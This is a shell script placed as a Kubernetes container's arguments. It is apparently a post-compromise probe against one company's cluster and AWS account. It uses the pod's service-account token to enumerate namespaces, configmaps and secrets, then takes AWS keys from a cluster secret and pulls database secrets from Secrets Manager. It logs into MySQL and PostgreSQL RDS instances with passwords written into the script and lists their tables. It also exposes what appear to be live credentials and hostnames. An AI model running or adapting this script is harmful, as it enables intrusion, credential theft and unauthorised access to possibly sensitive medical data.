containers.name: probe
args:
#!/bin/sh
set -u
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token)
API=https://kubernetes.default.svc
get(){ wget -q -O - --timeout=30 --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
echo "===I3030C3_START utc=$(date -u +%FT%TZ) host=$(hostname)==="

timeout 240 apk add --no-cache curl jq mariadb-client postgresql16-client aws-cli openssl >/tmp/apk.log 2>&1
echo "apk_rc=$? jq=$(command -v jq) mysql=$(command -v mysql) psql=$(command -v psql) aws=$(command -v aws) openssl=$(command -v openssl)"
tail -3 /tmp/apk.log 2>/dev/null

echo "===PODS_ARGOCD==="
get "$API/api/v1/namespaces/argocd/pods?limit=100" | jq -r '.items[]? | "POD \(.metadata.name) phase=\(.status.phase)"' 2>/dev/null
echo "===NODES==="
get "$API/api/v1/nodes?limit=20" | jq -r '.items[]? | "NODE \(.metadata.name) \(.status.nodeInfo.kubeletVersion // "")"' 2>/dev/null
echo "===CM_NAMES==="
for ns in audit-log authorization-service cognito-service data-management de-identifier-service imfusion-service metadata-extraction-service mlflow notification-service s3-ingestion user-management-service; do
  get "$API/api/v1/namespaces/$ns/configmaps?limit=200" | jq -r --arg ns "$ns" '.items[]? | "\($ns)|\(.metadata.name)"' 2>/dev/null | grep -v 'kube-root-ca.crt' | head -15
done
echo "===OTHER_NS_SECRET_NAMES==="
for ns in amazon-cloudwatch argo-rollouts default istio-system keda kube-public; do
  get "$API/api/v1/namespaces/$ns/secrets?limit=200" > /tmp/s2.json
  E=$(jq -r '.message // empty' /tmp/s2.json 2>/dev/null)
  if [ -n "$E" ]; then echo "SECLIST_ERR $ns: $E"; continue; fi
  jq -r --arg ns "$ns" '.items[]? | "\($ns)|\(.metadata.name)|\((.data // {})|keys|join(","))"' /tmp/s2.json 2>/dev/null
done

echo "===AWS_BEGIN==="
CREDS=$(get "$API/api/v1/namespaces/notification-service/secrets/rds-secrets")
AK=$(printf '%s' "$CREDS" | jq -r '.data.ACCESS_KEY // empty' 2>/dev/null | base64 -d 2>/dev/null)
SK=$(printf '%s' "$CREDS" | jq -r '.data.SECRET_KEY // empty' 2>/dev/null | base64 -d 2>/dev/null)
export AWS_ACCESS_KEY_ID="$AK" AWS_SECRET_ACCESS_KEY="$SK" AWS_DEFAULT_REGION=us-west-2
if command -v aws >/dev/null 2>&1 && [ -n "$AK" ]; then
  echo "---STS"; timeout 25 aws sts get-caller-identity --output json 2>&1 | head -8
  MYSQL_JSON=$(timeout 25 aws secretsmanager get-secret-value --secret-id lazamedical-dev01-usw2-mysql-1-db-secret --query SecretString --output text 2>/tmp/smerr); echo "---SM mysql rc=$?"; echo "$MYSQL_JSON" | head -c 500; echo
  DP_JSON=$(timeout 25 aws secretsmanager get-secret-value --secret-id lazamedical-dp-dev01-usw2-postgresql-db-secret --query SecretString --output text 2>/tmp/smerr2); echo "---SM dp rc=$?"; echo "$DP_JSON" | head -c 500; echo
  ML_JSON=$(timeout 25 aws secretsmanager get-secret-value --secret-id lazamedical-dp-dev01-usw2-postgresql1-db1-secret1 --query SecretString --output text 2>/tmp/smerr3); echo "---SM mlflow rc=$?"; echo "$ML_JSON" | head -c 500; echo
else
  echo "no aws cli or no creds"
fi
echo "===AWS_END==="

MH='lazamedical-dev01-usw2-mysql-rds1.c96aqiuye5yb.us-west-2.rds.amazonaws.com'
PH2='lazamedical-dev01-usw2-postgresql-rds2.c96aqiuye5yb.us-west-2.rds.amazonaws.com'
PHDP='lazamedical-dp-dev01-usw2-postgresql-rds.c96aqiuye5yb.us-west-2.rds.amazonaws.com'
PH1='lazamedical-dp-dev01-usw2-postgresql-rds1.c96aqiuye5yb.us-west-2.rds.amazonaws.com'

echo "===MYSQL_SSM_BEGIN==="
if command -v mysql >/dev/null 2>&1; then
  export MYSQL_PWD='Wv1h=_zJ7?uU3L6?'
  timeout 25 mysql --connect-timeout=8 --ssl-verify-server-cert=OFF -h "$MH" -P 3306 -u admin -D user_management -N -e "SELECT VERSION(); SELECT CURRENT_USER();" 2>&1 | head -6
  timeout 25 mysql --connect-timeout=8 --ssl-verify-server-cert=OFF -h "$MH" -P 3306 -u admin -D user_management -N -e "SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='user_management'" 2>&1 | head -c 3000; echo
  unset MYSQL_PWD
  if [ -n "${MYSQL_JSON:-}" ] && echo "$MYSQL_JSON" | grep -q '{'; then
    echo "---MYSQL_SM_TRY"
    MU=$(echo "$MYSQL_JSON" | jq -r '.username // "admin"' 2>/dev/null)
    MP=$(echo "$MYSQL_JSON" | jq -r '.password // empty' 2>/dev/null)
    MH2=$(echo "$MYSQL_JSON" | jq -r '.host // empty' 2>/dev/null)
    echo "user=$MU host=$MH2 passlen=${#MP}"
    MYSQL_PWD="$MP" timeout 25 mysql --connect-timeout=8 --ssl-verify-server-cert=OFF -h "${MH2:-$MH}" -P 3306 -u "$MU" -N -e "SELECT VERSION(); SELECT CURRENT_USER(); SHOW DATABASES;" 2>&1 | head -12
    unset MYSQL_PWD
  fi
else
  echo "no mysql client"
fi
echo "===MYSQL_SSM_END==="

echo "===PG_RDS2_BEGIN==="
if command -v psql >/dev/null 2>&1; then
  export PGPASSWORD='-W%ZHTpi&X(%)%SW'; export PGCONNECT_TIMEOUT=8
  timeout 25 psql -w -h "$PH2" -p 5432 -U postgres_admin -d user_management -At -c "select version(); select current_user;" 2>&1 | head -4
  unset PGPASSWORD
else echo "no psql"; fi
echo "===PG_RDS2_END==="

echo "===PG_DP_BEGIN==="
if command -v psql >/dev/null 2>&1; then
  export PGPASSWORD='1+nGZ&j1e?BZ*orJ'; export PGCONNECT_TIMEOUT=8
  timeout 25 psql -w -h "$PHDP" -p 5432 -U postgres_admin -d dp_service -At -c "select version(); select current_user;" 2>&1 | head -4
  timeout 25 psql -w -h "$PHDP" -p 5432 -U postgres_admin -d dp_service -At -c "select table_schema||'.'||table_name from information_schema.tables where table_type='BASE TABLE' and table_schema not in ('pg_catalog','information_schema') order by 1" 2>&1 | tr '\n' ' ' | head -c 6000; echo
  unset PGPASSWORD
  if [ -n "${DP_JSON:-}" ] && echo "$DP_JSON" | grep -q '{'; then
    echo "---DP_SM_TRY"
    DU=$(echo "$DP_JSON" | jq -r '.username // "postgres_admin"' 2>/dev/null)
    DPP=$(echo "$DP_JSON" | jq -r '.password // empty' 2>/dev/null)
    echo "user=$DU passlen=${#DPP}"
    PGPASSWORD="$DPP" PGCONNECT_TIMEOUT=8 timeout 25 psql -w -h "$PHDP" -p 5432 -U "$DU" -d dp_service -At -c "select version(); select current_user;" 2>&1 | head -4
  fi
else echo "no psql"; fi
echo "===PG_DP_END==="

echo "===PG_MLFLOW_BEGIN==="
if command -v psql >/dev/null 2>&1; then
  export PGPASSWORD='qdRd#3DI-YDcV35!'; export PGCONNECT_TIMEOUT=8
  timeout 25 psql -w -h "$PH1" -p 5432 -U postgres_admin -d mlflow_service -At -c "select version(); select current_user;" 2>&1 | head -4
  timeout 25 psql -w -h "$PH1" -p 5432 -U postgres_admin -d mlflow_service -At -c "select table_schema||'.'||table_name from information_schema.tables where table_type='BASE TABLE' and table_schema not in ('pg_catalog','information_schema') order by 1" 2>&1 | tr '\n' ' ' | head -c 6000; echo
  unset PGPASSWORD
  if [ -n "${ML_JSON:-}" ] && echo "$ML_JSON" | grep -q '{'; then
    echo "---ML_SM_TRY"
    MU2=$(echo "$ML_JSON" | jq -r '.username // "postgres_admin"' 2>/dev/null)
    MP2=$(echo "$ML_JSON" | jq -r '.password // empty' 2>/dev/null)
    echo "user=$MU2 passlen=${#MP2}"
    PGPASSWORD="$MP2" PGCONNECT_TIMEOUT=8 timeout 25 psql -w -h "$PH1" -p 5432 -U "$MU2" -d mlflow_service -At -c "select version(); select current_user;" 2>&1 | head -4
  fi
else echo "no psql"; fi
echo "===PG_MLFLOW_END==="

echo "===MLFLOW_AUTH_TABLES==="
if command -v psql >/dev/null 2>&1; then
  export PGPASSWORD='qdRd#3DI-YDcV35!'; export PGCONNECT_TIMEOUT=8
  timeout 25 psql -w -h "$PH1" -p 5432 -U postgres_admin -d mlflow_auth -At -c "select table_schema||'.'||table_name from information_schema.tables where table_type='BASE TABLE' and table_schema not in ('pg_catalog','information_schema') order by 1" 2>&1 | tr '\n' ' ' | head -c 4000; echo
  unset PGPASSWORD
fi
echo "===I3030C3_DONE utc=$(date -u +%FT%TZ)==="
